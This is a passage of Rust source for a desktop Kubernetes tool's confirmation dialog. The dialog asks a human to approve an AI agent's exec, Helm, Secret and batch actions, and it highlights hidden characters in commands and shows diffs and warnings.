//! The dialog that asks the user about an agent's mutating call or about a
//! right for the rest of its session (ADR 0005, human in the loop; #227).
//! Shown in the main window, one request at a time; no answer before the
//! timeout counts as a rejection. Revealing a Secret carries a warning that
//! cannot be missed. Notices (an agent wanted a value where revealing is
//! off) appear as notifications with a way to the context's settings.

use gpui_kit::component::button::{Button, ButtonVariants as _};
use gpui_kit::component::checkbox::Checkbox;
use gpui_kit::component::notification::{Notification, NotificationDelivery};
use gpui_kit::component::scroll::Scrollbar;
use gpui_kit::component::{ActiveTheme as _, Disableable as _, Sizable as _, WindowExt as _};
use gpui_kit::prelude::FluentBuilder as _;
use gpui_kit::*;
use kubach_i18n::t;
use kubach_mcp::{
    BatchAction, BatchChange, ConfirmationDecision, ConfirmationRequest, DiffCut, Grant,
    HelmCredentials, RequestKind,
};
use kubach_ui::{format_bytes, measure};

use std::rc::Rc;

use super::{AgentState, Notice, countdown, global, secret_dialog};
use crate::settings::{AppSettings, SettingsTarget, open_settings};

/// Shows pending confirmations and notices in `window` as they arrive.
/// Call once for the main window.
pub fn watch_confirmations<V: 'static>(window: &mut Window, cx: &mut Context<V>) {
    let Some(agent) = global(cx) else {
        return;
    };
    cx.observe_in(&agent, window, |_, agent, window, cx| {
        show_notices(&agent, window, cx);
        // Before `show_next` raises the window.
        notify_system(&agent, window, cx);
        show_next(agent, window, cx)
    })
    .detach();
    // The user came back on their own: the notification has done its job.
    cx.observe_window_activation(window, move |_, window, cx| {
        if window.is_window_active() {
            retract_system_notice(&agent, window, cx);
        }
    })
    .detach();
}

/// Tags the system notification about pending confirmations: there is one
/// at a time, the newest question replaces it.
struct AgentWaiting;

/// The system notification about pending confirmations (#102).
#[derive(Debug, Default)]
pub(super) struct SystemNotice {
    /// The newest confirmation the user was told of, or that came while
    /// they were in the window.
    seen: u64,
    /// A notification may be on screen.
    posted: bool,
}

impl SystemNotice {
    /// Whether confirmation `newest` calls for a notification: a question
    /// not seen yet, with the window hidden or not focused. Notes it as
    /// seen either way, so coming back later does not repeat it.
    fn should_post(&mut self, newest: u64, window_active: bool, enabled: bool) -> bool {
        if newest <= self.seen {
            return false;
        }
        self.seen = newest;
        let post = enabled && !window_active;
        self.posted |= post;
        post
    }

    /// Whether a notification has to go: nothing waits, or the user is back.
    fn should_retract(&mut self) -> bool {
        std::mem::take(&mut self.posted)
    }
}

/// Tells the user through the OS that an agent waits for them, if they are
/// not in the window. Clicking it brings up the window with the question,
/// which `show_next` opened there. The text names the kind of question,
/// the agent and the context, not what the agent wrote: it may show on a
/// lock screen.
fn notify_system(agent: &Entity<AgentState>, window: &mut Window, cx: &mut App) {
    let Some((id, request)) = agent
        .read(cx)
        .pending
        .back()
        .map(|pending| (pending.id, pending.request.clone()))
    else {
        retract_system_notice(agent, window, cx);
        return;
    };
    let enabled = AppSettings::try_global(cx)
        .is_none_or(|settings| settings.read(cx).get().agent.system_notifications);
    let active = window.is_window_active();
    let post = agent.update(cx, |state, _| {
        state.system_notice.should_post(id, active, enabled)
    });
    if !post {
        return;
    }
    window.push_notification(
        Notification::info(t!(
            "agent-system-notification-body",
            client = request.client.as_str(),
            context = request.context.as_str()
        ))
        .id::<AgentWaiting>()
        .title(title(&request))
        .delivery(NotificationDelivery::System),
        cx,
    );
}

fn retract_system_notice(agent: &Entity<AgentState>, window: &mut Window, cx: &mut App) {
    if agent.update(cx, |state, _| state.system_notice.should_retract()) {
        window.remove_notification::<AgentWaiting>(cx);
    }
}

fn show_notices(agent: &Entity<AgentState>, window: &mut Window, cx: &mut App) {
    let notices = agent.update(cx, |state, _| state.take_notices());
    for Notice {
        title,
        context,
        message,
    } in notices
    {
        let notification = Notification::warning(message.to_string())
            .title(title.to_string())
            .action(move |_, _, _| {
                let context = context.clone();
                Button::new("agent-reveal-off-settings")
                    .small()
                    .outline()
                    .label(t!("agent-security-settings"))
                    .on_click(move |_, _, cx| {
                        open_settings(SettingsTarget::security(context.clone()), cx)
                    })
            });
        window.push_notification(notification, cx);
    }
}

/// The dialog title for `request`.
fn title(request: &ConfirmationRequest) -> String {
    match &request.kind {
        RequestKind::Grant {
            grant: Grant::Read { .. },
        } => t!("agent-title-read"),
        RequestKind::Grant {
            grant: Grant::Secret { .. },
        } => t!("agent-title-reveal"),
        RequestKind::Grant {
            grant: Grant::Modify { .. },
        } => t!("agent-title-modify"),
        RequestKind::Exec { .. } => t!("agent-title-exec"),
        RequestKind::NodeCommand { .. } => t!("agent-title-node-command"),
        RequestKind::PortForward { .. } => t!("agent-title-port-forward"),
        RequestKind::Access { .. } => t!("agent-title-access"),
        RequestKind::Helm { helm } => match helm.action {
            kubach_mcp::HelmAction::Install => t!("agent-title-helm-install"),
            kubach_mcp::HelmAction::Upgrade => t!("agent-title-helm-upgrade"),
            kubach_mcp::HelmAction::Rollback => t!("agent-title-helm-rollback"),
            kubach_mcp::HelmAction::Uninstall => t!("agent-title-helm-uninstall"),
        },
        RequestKind::ChartSource { .. } => t!("agent-title-chart-source"),
        RequestKind::UseContext { .. } => t!("agent-title-use-context"),
        RequestKind::Namespaces { .. } => t!("agent-title-namespaces"),
        RequestKind::Batch { batch } => match batch.action {
            BatchAction::Scale => t!("agent-title-batch-scale"),
            BatchAction::Restart => t!("agent-title-batch-restart"),
        },
        RequestKind::Secret { secret } => secret_dialog::title(secret),
        RequestKind::Call | RequestKind::RevealBlocked { .. } => t!("agent-title-call"),
    }
}

/// A piece of an exec argument as the dialog shows it (#194).
#[derive(Clone, Debug, PartialEq, Eq)]
enum ArgPart {
    /// Shown as is.
    Text(String),
    /// Stands for characters that would be invisible or misleading
    /// (`\n`, `\t`, `␣` for a significant space, `\u{202E}`); drawn
    /// highlighted so it cannot pass for the argument's own text.
    Escape(String),
}

/// Marks a space that would otherwise not be seen.
const VISIBLE_SPACE: char = '␣';

/// `arg` split into text and spelled-out characters: control, invisible
/// and bidi characters always, non-ASCII spaces always, ASCII spaces when
/// leading, trailing or in a run (long runs push text out of sight).
fn arg_parts(arg: &str) -> Vec<ArgPart> {
    if arg.is_empty() {
        return vec![ArgPart::Escape(t!("agent-arg-empty"))];
    }
    let chars: Vec<char> = arg.chars().collect();
    let first_visible = chars.iter().position(|&c| c != ' ');
    let last_visible = chars.iter().rposition(|&c| c != ' ');
    let mut parts: Vec<ArgPart> = Vec::new();
    let mut push = |part: ArgPart| match (parts.last_mut(), part) {
        (Some(ArgPart::Text(text)), ArgPart::Text(more))
        | (Some(ArgPart::Escape(text)), ArgPart::Escape(more)) => text.push_str(&more),
        (_, part) => parts.push(part),
    };
    for (ix, &c) in chars.iter().enumerate() {
        let part = match c {
            '\n' => ArgPart::Escape("\\n".into()),
            '\t' => ArgPart::Escape("\\t".into()),
            '\r' => ArgPart::Escape("\\r".into()),
            ' ' => {
                let edge = first_visible.is_none_or(|first| ix < first)
                    || last_visible.is_none_or(|last| ix > last);
                let in_run = chars.get(ix + 1) == Some(&' ')
                    || ix.checked_sub(1).and_then(|prev| chars.get(prev)) == Some(&' ');
                if edge || in_run {
                    ArgPart::Escape(VISIBLE_SPACE.into())
                } else {
                    ArgPart::Text(" ".into())
                }
            }
            c if kubach_mcp::policy::hidden_in_command(c) || c.is_whitespace() => {
                ArgPart::Escape(format!("\\u{{{:04X}}}", u32::from(c)))
            }
            c => ArgPart::Text(c.into()),
        };
        push(part);
    }
    parts
}

/// The text of `parts` and the byte ranges of its escapes, for
/// [`StyledText::with_highlights`].
fn arg_text(parts: &[ArgPart]) -> (String, Vec<std::ops::Range<usize>>) {
    let mut text = String::new();
    let mut escapes = Vec::new();
    for part in parts {
        match part {
            ArgPart::Text(plain) => text.push_str(plain),
            ArgPart::Escape(shown) => {
                let start = text.len();
                text.push_str(shown);
                escapes.push(start..text.len());
            }
        }
    }
    (text, escapes)
}

/// `arg` with its escapes highlighted.
fn styled_arg(arg: &str, cx: &App) -> StyledText {
    let (text, escapes) = arg_text(&arg_parts(arg));
    let style = HighlightStyle {
        color: Some(cx.theme().warning),
        background_color: Some(cx.theme().warning.opacity(0.15)),
        ..HighlightStyle::default()
    };
    StyledText::new(text).with_highlights(escapes.into_iter().map(|range| (range, style)))
}

/// The exec command: every argument on its own numbered, wrapping line.
fn command_block(command: &[String], cx: &App) -> impl IntoElement + use<> {
    let theme = cx.theme();
    let bytes: usize = command.iter().map(String::len).sum();
    div()
        .id("confirm-command")
        .max_h(px(320.))
        .overflow_y_scroll()
        .flex()
        .flex_col()
        .gap_1()
        .p_2()
        .rounded_md()
        .bg(theme.muted)
        .text_xs()
        .child(div().text_color(theme.muted_foreground).child(t!(
            "agent-command-header",
            count = command.len(),
            bytes = bytes
        )))
        .children(command.iter().enumerate().map(|(ix, arg)| {
            div()
                .flex()
                .gap_2()
                .font_family(theme.mono_font_family.clone())
                .child(
                    div()
                        .w(px(24.))
                        .flex_shrink_0()
                        .text_color(theme.muted_foreground)
                        .child(ix.to_string()),
                )
                .child(
                    div()
                        .flex_1()
                        .min_w_0()
                        .text_color(theme.foreground)
                        .child(styled_arg(arg, cx)),
                )
        }))
}

/// A batch (#108): every object it will change, each on its own line with
/// its old and new replicas, then what it leaves out. Nothing is cut: this
/// list is what the user approves, and the tool bounds its length.
fn batch_block(batch: &BatchChange, cx: &App) -> impl IntoElement + use<> {
    let theme = cx.theme();
    div()
        .flex()
        .flex_col()
        .gap_2()
        .child(
            div()
                .id("confirm-batch")
                .max_h(px(320.))
                .overflow_y_scroll()
                .flex()
                .flex_col()
                .gap_1()
                .p_2()
                .rounded_md()
                .bg(theme.muted)
                .text_xs()
                .child(
                    div()
                        .text_color(theme.muted_foreground)
                        .child(t!("agent-batch-objects", count = batch.objects.len())),
                )
                .children(batch.objects.iter().map(|object| {
                    div()
                        .flex()
                        .gap_2()
                        .font_family(theme.mono_font_family.clone())
                        .text_color(theme.foreground)
                        .child(div().flex_1().min_w_0().child(object.label()))
                        .children(
                            object
                                .change()
                                .map(|change| div().flex_shrink_0().child(change)),
                        )
                })),
        )
        .when(!batch.left_out.is_empty(), |this| {
            this.child(warning_block(
                t!("agent-batch-left-out", count = batch.left_out.len()),
                batch.left_out.clone(),
                theme.warning,
                cx,
            ))
        })
}

/// Height the dialog's title, paddings, margins and our buttons take
/// around the scrolling body.
const DIALOG_CHROME: f32 = 220.;

/// Height of the "don't ask again" row by the buttons and its gap (#30).
const REMEMBER_ROW: f32 = 32.;

/// "CustomResourceDefinition × 6, ClusterRole × 12": objects counted by
/// kind (the first word of each), in the order they first appear.
fn kind_counts(objects: &[String]) -> String {
    let mut counts: Vec<(&str, usize)> = Vec::new();
    for object in objects {
        let kind = object.split_whitespace().next().unwrap_or_default();
        match counts.iter_mut().find(|(k, _)| *k == kind) {
            Some((_, n)) => *n += 1,
            None => counts.push((kind, 1)),
        }
    }
    counts
        .iter()
        .map(|(kind, n)| format!("{kind} × {n}"))
        .collect::<Vec<_>>()
        .join(", ")
}

/// What a row of a diff is, for its color.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum DiffKind {
    /// `--- old` and `+++ new`.
    Header,
    Added,
    Removed,
    /// `@@ -1,3 +1,3 @@`.
    Hunk,
    Context,
}

/// One row of a diff in the dialog: a line, or a piece of a long one.
#[derive(Clone, Debug, PartialEq, Eq)]
struct DiffRow {
    kind: DiffKind,
    text: SharedString,
}

/// A line longer than this many bytes is split into rows of its own: one
/// text of a megabyte (a ConfigMap's value on one line) would be shaped
/// whole whenever it is in view.
const MAX_ROW_BYTES: usize = 2000;

/// Rows of a diff above which only those in view are laid out (#137): a
/// diff of megabytes is a hundred thousand lines.
const VIRTUAL_DIFF_ROWS: usize = 300;

/// Height a row of a diff is taken for until it is laid out.
const DIFF_ROW_HINT: Pixels = px(19.);

/// The rows of a unified diff, colored as git does: added green, removed
/// red, hunk headers muted. Nothing is left out; a long line becomes
/// several rows of its kind.
fn diff_rows(text: &str) -> Vec<DiffRow> {
    let mut rows = Vec::new();
    for line in text.lines() {
        let kind = if line.starts_with("+++") || line.starts_with("---") {
            DiffKind::Header
        } else if line.starts_with('+') {
            DiffKind::Added
        } else if line.starts_with('-') {
            DiffKind::Removed
        } else if line.starts_with("@@") {
            DiffKind::Hunk
        } else {
            DiffKind::Context
        };
        let mut rest = line;
        while rest.len() > MAX_ROW_BYTES {
            let mut end = MAX_ROW_BYTES;
            while !rest.is_char_boundary(end) {
                end -= 1;
            }
            let (piece, tail) = rest.split_at(end);
            rows.push(DiffRow {
                kind,
                text: SharedString::new(piece),
            });
            rest = tail;
        }
        rows.push(DiffRow {
            kind,
            // An empty text would have no height.
            text: SharedString::new(if rest.is_empty() { " " } else { rest }),
        });
    }
    rows
}

/// A row as drawn. Long lines wrap: nothing hides past the edge.
fn diff_row(row: &DiffRow, cx: &App) -> Div {
    let theme = cx.theme();
    let color = match row.kind {
        DiffKind::Added => theme.success,
        DiffKind::Removed => theme.danger,
        DiffKind::Hunk => theme.muted_foreground,
        DiffKind::Header | DiffKind::Context => theme.foreground,
    };
    div().text_color(color).child(row.text.clone())
}

/// A diff of the dialog, split into rows once: the dialog is drawn again
/// every second and on every scroll. A long one keeps the state of its
/// virtual list (#137).
struct DiffBlock {
    rows: Rc<[DiffRow]>,
    lines: usize,
    bytes: usize,
    list: Option<ListState>,
}

impl DiffBlock {
    fn new(text: &str) -> Self {
        let rows: Rc<[DiffRow]> = diff_rows(text).into();
        let list = (rows.len() > VIRTUAL_DIFF_ROWS).then(|| {
            ListState::new(rows.len(), ListAlignment::Top, px(400.))
                .with_uniform_item_height(DIFF_ROW_HINT)
        });
        Self {
            lines: text.lines().count(),
            bytes: text.len(),
            rows,
            list,
        }
    }

    /// The diff in a block of `max_height` at most, scrolling inside. A
    /// long one says its size and takes the whole height.
    fn render(&self, id: &'static str, max_height: Pixels, cx: &App) -> AnyElement {
        let theme = cx.theme();
        let block = div()
            .id(id)
            .rounded_md()
            .bg(theme.muted)
            .font_family(theme.mono_font_family.clone())
            .text_xs();
        let Some(list_state) = &self.list else {
            return block
                .max_h(max_height)
                .overflow_y_scroll()
                .p_2()
                .children(self.rows.iter().map(|row| diff_row(row, cx)))
                .into_any_element();
        };
        let rows = self.rows.clone();
        div()
            .flex()
            .flex_col()
            .gap_1()
            .child(div().text_xs().text_color(theme.muted_foreground).child(t!(
                "agent-diff-size",
                count = self.lines,
                size = format_bytes(self.bytes as u64)
            )))
            .child(
                block
                    .relative()
                    .h(max_height)
                    .child(
                        list(list_state.clone(), move |ix, _, cx| match rows.get(ix) {
                            Some(row) => diff_row(row, cx).into_any_element(),
                            None => Empty.into_any_element(),
                        })
                        .size_full()
                        .p_2(),
                    )
                    .child(Scrollbar::vertical(list_state)),
            )
            .into_any_element()
    }
}

/// Whether `details` of `request` is shown as a diff: not a command, a
/// batch or the meaning of a right.
fn details_are_a_diff(request: &ConfirmationRequest) -> bool {
    !matches!(
        request.kind,
        RequestKind::Exec { .. }
            | RequestKind::NodeCommand { .. }
            | RequestKind::Batch { .. }
            | RequestKind::Grant { .. }
            | RequestKind::Access { .. }
            | RequestKind::ChartSource { .. }
            | RequestKind::UseContext { .. }
            | RequestKind::Namespaces { .. }
    ) && !request.details.trim().is_empty()
}

/// What the warning about a diff cut by Kubach says (#137): how much is
/// shown, how much is not and which objects' changes are not.
fn cut_lines(cut: &DiffCut) -> (String, Vec<String>) {
    let title = t!(
        "agent-diff-cut-title",
        shown = format_bytes(cut.shown_bytes as u64),
        total = format_bytes(cut.total_bytes as u64)
    );
    let mut lines = vec![t!(
        "agent-diff-cut-hidden",
        count = cut.hidden_lines,
        size = format_bytes(cut.total_bytes.saturating_sub(cut.shown_bytes) as u64)
    )];
    if !cut.objects.is_empty() {
        lines.push(t!(
            "agent-diff-cut-objects",
            objects = cut.objects.join(", ")
        ));
    }
    if cut.more_objects > 0 {
        lines.push(t!("agent-diff-cut-more-objects", count = cut.more_objects));
    }
    (title, lines)
}

fn show_next(agent: Entity<AgentState>, window: &mut Window, cx: &mut App) {
    let state = agent.read(cx);
    if let Some(shown) = state.shown {
        if state.pending_by_id(shown).is_some() {
            return;
        }
        // Timed out or answered elsewhere while shown.
        agent.update(cx, |state, _| state.shown = None);
        window.close_dialog(cx);
    }
    let Some((id, title, form)) = agent.read(cx).pending.front().map(|pending| {
        let form = matches!(
            &pending.request.kind,
            RequestKind::Secret { secret } if secret.op.takes_values()
        );
        (pending.id, title(&pending.request), form)
    }) else {
        return;
    };
    agent.update(cx, |state, _| state.shown = Some(id));
    window.activate_window();
    // Kubach's own form for Secret values (#230).
    if form {
        secret_dialog::open(agent, id, window, cx);
        return;
    }
    let view = cx.new(|cx| ConfirmView::new(agent.clone(), id, cx));
    window.open_dialog(cx, move |dialog, _, _| {
        dialog
            .title(title.clone())
            .w(px(640.))
            .overlay_closable(false)
            .keyboard(false)
            .close_button(false)
            .child(view.clone())
    });
}

struct ConfirmView {
    agent: Entity<AgentState>,
    id: u64,
    /// The user ticked "I understand" for the dangerous findings; the
    /// approve button waits for it (#194).
    acknowledged: bool,
    /// "Allow by default" on an access request (#15); off until the user
    /// ticks it.
    always: bool,
    /// "Run this helm call with my credentials" (#18); off until the user
    /// ticks it, and the approve button waits for it.
    as_user: bool,
    /// The whole values of a Helm change, folded under the values diff.
    show_values: bool,
    /// Every object behind "run with my credentials", folded under counts.
    show_user_objects: bool,
    /// "Don't ask again until the session ends" for this kind of change in
    /// this namespace (#30); off until the user ticks it.
    remember: bool,
    /// The request, as it came: a diff of megabytes is not copied on every
    /// frame.
    request: Option<Rc<ConfirmationRequest>>,
    /// `details` when they are a diff ([`details_are_a_diff`]).
    details: Option<DiffBlock>,
    /// The values diff of a Helm change.
    values_diff: Option<DiffBlock>,
    _observe: Subscription,
}

impl ConfirmView {
    fn new(agent: Entity<AgentState>, id: u64, cx: &mut Context<Self>) -> Self {
        let observe = cx.observe(&agent, |_, _, cx| cx.notify());
        let request = agent
            .read(cx)
            .pending_by_id(id)
            .map(|pending| Rc::new(pending.request.clone()));
        let details = request
            .as_deref()
            .filter(|request| details_are_a_diff(request))
            .map(|request| DiffBlock::new(&request.details));
        let values_diff = request.as_deref().and_then(|request| match &request.kind {
            RequestKind::Helm { helm } if !helm.values_diff.trim().is_empty() => {
                Some(DiffBlock::new(&helm.values_diff))
            }
            _ => None,
        });
        Self {
            request,
            details,
            values_diff,
            agent,
            id,
            acknowledged: false,
            always: false,
            as_user: false,
            show_values: false,
            show_user_objects: false,
            remember: false,
            _observe: observe,
        }
    }

    fn answer(&self, decision: ConfirmationDecision, window: &mut Window, cx: &mut App) {
        let id = self.id;
        self.agent
            .update(cx, |agent, cx| agent.resolve(id, decision, cx));
        window.close_dialog(cx);
    }
}

/// Width of the [`field`] labels: the widest of them all, so the values
/// line up in every language (#444).
fn label_width(window: &Window, cx: &App) -> Pixels {
    let labels = [
        t!("agent-field-agent"),
        t!("agent-field-context"),
        t!("agent-field-namespace"),
        t!("agent-field-right"),
        t!("agent-field-release"),
        t!("agent-field-chart"),
        t!("agent-field-version"),
        t!("agent-field-revision"),
        t!("agent-field-runs-as"),
        t!("agent-field-asks-for"),
        t!("agent-field-access-now"),
    ];
    measure::label_column_width(
        labels.iter().map(String::as_str),
        measure::TEXT_SM,
        px(96.),
        px(180.),
        window,
        cx,
    )
}

fn field(
    label: String,
    value: impl Into<SharedString>,
    label_width: Pixels,
    cx: &App,
) -> impl IntoElement {
    div()
        .flex()
        .gap_2()
        .text_sm()
        .child(
            div()
                .w(label_width)
                .flex_shrink_0()
                .text_color(cx.theme().muted_foreground)
                .child(label),
        )
        .child(div().flex_1().min_w_0().child(value.into()))
}

/// A [`field`] with a muted remark under the value.
fn field_with_note(
    label: String,
    value: impl Into<SharedString>,
    note: String,
    label_width: Pixels,
    cx: &App,
) -> impl IntoElement {
    div()
        .flex()
        .gap_2()
        .text_sm()
        .child(
            div()
                .w(label_width)
                .flex_shrink_0()
                .text_color(cx.theme().muted_foreground)
                .child(label),
        )
        .child(
            div()
                .flex_1()
                .min_w_0()
                .flex()
                .flex_wrap()
                .gap_x_2()
                .child(value.into())
                .child(
                    div()
                        .text_xs()
                        .text_color(cx.theme().muted_foreground)
                        .child(note),
                ),
        )
}

/// The bordered block that must not be overlooked.
fn warning_block(
    title: String,
    lines: Vec<String>,
    color: Hsla,
    cx: &App,
) -> impl IntoElement + use<> {
    div()
        .flex()
        .flex_col()
        .gap_1()
        .p_2()
        .rounded_md()
        .border_1()
        .border_color(color)
        .text_sm()
        .child(
            div()
                .text_color(color)
                .font_weight(FontWeight::MEDIUM)
                .child(title),
        )
        .children(
            lines
                .into_iter()
                .map(|line| div().text_color(cx.theme().foreground).child(line)),
        )
}

impl Render for ConfirmView {
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        let label_width = label_width(window, cx);
        let theme = cx.theme().clone();
        let agent = self.agent.read(cx);
        let (Some(pending), Some(request)) = (agent.pending_by_id(self.id), self.request.clone())
        else {
            return div().text_sm().child(t!("agent-no-longer-pending"));
        };
        let left = countdown(pending.deadline);
        let queued = agent.pending.len().saturating_sub(1);
        let client_only = !request.mode.server_enforced();
        let grant = match &request.kind {
            RequestKind::Grant { grant } => Some(grant.clone()),
            _ => None,
        };
        let secret = matches!(grant, Some(Grant::Secret { .. }));
        // A Helm change (#418).
        let helm = match &request.kind {
            RequestKind::Helm { helm } => Some(&**helm),
            _ => None,
        };
        let source = matches!(
            request.kind,
            RequestKind::ChartSource { .. }
                | RequestKind::UseContext { .. }
                | RequestKind::Namespaces { .. }
        );
        // Access beyond the minimum (#15).
        let access = match &request.kind {
            RequestKind::Access { raise, current, .. } => Some((*raise, *current)),
            _ => None,
        };
        // Copying or deleting a Secret (#230).
        let secret_change = match &request.kind {
            RequestKind::Secret { secret } => Some(secret.clone()),
            _ => None,
        };
        let deleting = secret_change
            .as_ref()
            .is_some_and(|secret| secret.op == kubach_mcp::SecretOp::Delete);
        let degraded = agent.server_limits_warning(&request.session_id, &request.namespace);
        let degraded_shown = degraded.is_some();
        // A batch across namespaces has no one namespace (#108).
        let namespace = match &request.kind {
            RequestKind::Batch { batch } => batch.namespaces().join(", "),
            _ => request.namespace.clone(),
        };

        let details = match &request.kind {
            // Exec is a command, not a diff: no colors, every argument apart.
            RequestKind::Exec { command } | RequestKind::NodeCommand { command, .. } => {
                Some(command_block(command, cx).into_any_element())
            }
            RequestKind::Batch { batch } => Some(batch_block(batch, cx).into_any_element()),
            _ => self
                .details
                .as_ref()
                .map(|diff| diff.render("confirm-details", px(280.), cx)),
        };
        // A command on a node's host (#106): the node instead of a
        // namespace, and what running it means.
        let node = match &request.kind {
            RequestKind::NodeCommand { node, .. } => Some(node.clone()),
            _ => None,
        };
        let on_host = node.is_some().then(|| {
            warning_block(
                t!("agent-node-command-title"),
                vec![t!("agent-node-command-warning")],
                theme.warning,
                cx,
            )
        });
        // Kubach cut the diff (#137): said right above it, never silently.
        let diff_cut = helm.and_then(|helm| helm.diff_cut.as_ref()).map(|cut| {
            let (title, lines) = cut_lines(cut);
            warning_block(title, lines, theme.danger, cx)
        });
        let values_diff = self.values_diff.as_ref().map(|diff| {
            div()
                .flex()
                .flex_col()
                .gap_1()
                .child(
                    div()
                        .text_xs()
                        .text_color(theme.muted_foreground)
                        .child(t!("agent-helm-values-diff")),
                )
                .child(diff.render("confirm-helm-values-diff", px(160.), cx))
        });
        let dangerous = (!request.dangerous.is_empty()).then(|| {
            warning_block(
                t!("agent-dangerous-title"),
                request
                    .dangerous
                    .iter()
                    .map(|finding| {
                        let (message, path) = (finding.message.as_str(), finding.path.as_str());
                        // What it does first (`manifest reads Secret db`),
                        // then where (#190).
                        match finding.document {
                            Some(doc) => t!(
                                "agent-dangerous-line-document",
                                message = message,
                                document = doc + 1,
                                path = path
                            ),
                            None => t!("agent-dangerous-line", message = message, path = path),
                        }
                    })
                    .collect(),
                theme.danger,
                cx,
            )
        });
        let needs_ack = dangerous.is_some();
        let has_dangerous = needs_ack || secret || deleting;
        let acknowledge = needs_ack.then(|| {
            Checkbox::new("confirm-acknowledge")
                .label(t!("agent-acknowledge"))
                .checked(self.acknowledged)
                .on_click(cx.listener(|this, checked: &bool, _, cx| {
                    this.acknowledged = *checked;
                    cx.notify();
                }))
        });
        // Helm under the user's own credentials (#18): the question with an
        // unticked box, or the warning once allowed.
        let credentials = helm
            .as_ref()
            .map(|helm| helm.credentials)
            .unwrap_or_default();
        let ask_user = credentials == HelmCredentials::AskUser;
        let as_user_block = helm.as_ref().and_then(|helm| match helm.credentials {
            HelmCredentials::Session => None,
            HelmCredentials::AskUser => Some(warning_block(
                t!("agent-helm-as-user-title"),
                [
                    t!("agent-helm-as-user-warning"),
                    t!("agent-helm-as-user-objects"),
                ]
                .into_iter()
                .chain(if self.show_user_objects {
                    helm.user_objects
                        .iter()
                        .map(|object| format!("  - {object}"))
                        .collect()
                } else {
                    vec![kind_counts(&helm.user_objects)]
                })
                .collect(),
                theme.danger,
                cx,
            )),
            HelmCredentials::User => Some(warning_block(
                t!("agent-helm-runs-as-user-title"),
                vec![t!("agent-helm-runs-as-user")],
                theme.danger,
                cx,
            )),
        });
        let show_all_objects = (ask_user && !self.show_user_objects).then(|| {
            Button::new("confirm-show-user-objects")
                .ghost()
                .xsmall()
                .label(t!("agent-helm-as-user-show-all"))
                .on_click(cx.listener(|this, _, _, cx| {
                    this.show_user_objects = true;
                    cx.notify();
                }))
        });
        let as_user_tick = ask_user.then(|| {
            Checkbox::new("confirm-as-user")
                .label(t!("agent-helm-as-user-tick"))
                .checked(self.as_user)
                .on_click(cx.listener(|this, checked: &bool, _, cx| {
                    this.as_user = *checked;
                    cx.notify();
                }))
        });
        let has_dangerous = has_dangerous || credentials != HelmCredentials::Session;
        let approve_blocked = (needs_ack && !self.acknowledged) || (ask_user && !self.as_user);
        // What a yes to a right means; for a Secret, the warning.
        let meaning = grant.as_ref().map(|_| {
            if secret {
                warning_block(
                    t!("agent-secret-leaves"),
                    vec![request.details.clone(), t!("agent-secret-no-take-back")],
                    theme.danger,
                    cx,
                )
                .into_any_element()
            } else {
                div()
                    .text_sm()
                    .text_color(theme.muted_foreground)
                    .child(request.details.clone())
                    .into_any_element()
            }
        });
        let always = self.always;
        let show_values = self.show_values;
        // Offered only where Kubach marked the request and the kind of
        // change may be remembered at all (#30): never for deletions,
        // Secrets, Helm with the user's credentials, dangerous fields or a
        // client-only namespace.
        let remember_offer = request
            .allow_remember
            .then(|| kubach_mcp::rememberable(&request))
            .flatten();
        let remember = remember_offer.is_some() && self.remember;
        let remember_tick = remember_offer.map(|offer| {
            Checkbox::new("confirm-remember")
                .label(match &offer.exact {
                    // Only this exact command on this node (#106).
                    Some(exact) => t!("agent-remember-node-command", node = exact.node.as_str()),
                    None => t!(
                        "agent-remember",
                        action = super::remembered_action_label(offer.action),
                        namespace = offer.namespace.as_str()
                    ),
                })
                .checked(remember)
                .on_click(cx.listener(|this, checked: &bool, _, cx| {
                    this.remember = *checked;
                    cx.notify();
                }))
        });
        let (reject, approve) = match (&grant, &secret_change) {
            _ if access.is_some() && always => (t!("agent-deny"), t!("agent-allow-always")),
            _ if access.is_some() => (t!("agent-deny"), t!("agent-allow-session")),
            _ if source => (t!("agent-deny"), t!("agent-allow-session")),
            _ if helm.is_some() => (
                t!("agent-reject"),
                match helm.as_ref().map(|helm| helm.action) {
                    // A yes leads to the dry run first, not the change (#18).
                    Some(kubach_mcp::HelmAction::Install | kubach_mcp::HelmAction::Upgrade)
                        if ask_user =>
                    {
                        t!("agent-helm-dry-run-as-user")
                    }
                    Some(kubach_mcp::HelmAction::Install) => t!("agent-helm-install"),
                    Some(kubach_mcp::HelmAction::Upgrade) => t!("agent-helm-upgrade"),
                    Some(kubach_mcp::HelmAction::Rollback) => t!("agent-helm-rollback"),
                    _ => t!("agent-helm-uninstall"),
                },
            ),
            (Some(Grant::Secret { .. }), _) => (t!("agent-dont-reveal"), t!("agent-reveal")),
            (Some(_), _) => (t!("agent-deny"), t!("agent-allow-session")),
            (None, Some(_)) if deleting => (t!("agent-keep-secret"), t!("agent-delete-secret")),
            (None, Some(_)) => (t!("agent-reject"), t!("agent-copy-secret")),
            (None, None) => (t!("agent-reject"), t!("agent-approve")),
        };
        let secret_parts = secret_change.as_ref().map(|secret| {
            div()
                .flex()
                .flex_col()
                .gap_2()
                .child(secret_dialog::target(&request, cx))
                .child(secret_dialog::agent_says(secret, cx))
                .children(secret_dialog::users(secret, cx))
        });

        // The buttons stay in sight: everything above them scrolls. The
        // dialog itself is at most the viewport less its margins, and its
        // title, paddings and our buttons take the rest, with the "don't
        // ask again" row next to the buttons when it is there (#30).
        let chrome = DIALOG_CHROME
            + if remember_tick.is_some() {
                REMEMBER_ROW
            } else {
                0.
            };
        let body_height = (window.viewport_size().height - px(chrome)).max(px(120.));
        div()
            .flex()
            .flex_col()
            .gap_3()
            .child(
                div()
                    .id("confirm-body")
                    .flex()
                    .flex_col()
                    .gap_3()
                    .max_h(body_height)
                    .overflow_y_scroll()
                    .children(secret_parts)
                    .child(
                        div()
                            .text_sm()
                            .font_weight(FontWeight::MEDIUM)
                            .child(request.summary.clone()),
                    )
                    .child(
                        div()
                            .flex()
                            .flex_col()
                            .gap_1()
                            .child(field_with_note(
                                t!("agent-field-agent"),
                                request.client.clone(),
                                t!("agent-client-unverified"),
                                label_width,
                                cx,
                            ))
                            .when(!request.context.is_empty(), |this| {
                                this.child(field(
                                    t!("agent-field-context"),
                                    request.context.clone(),
                                    label_width,
                                    cx,
                                ))
                            })
                            .when(node.is_none(), |this| {
                                this.child(field(
                                    t!("agent-field-namespace"),
                                    namespace,
                                    label_width,
                                    cx,
                                ))
                            })
                            .when_some(node, |this, node| {
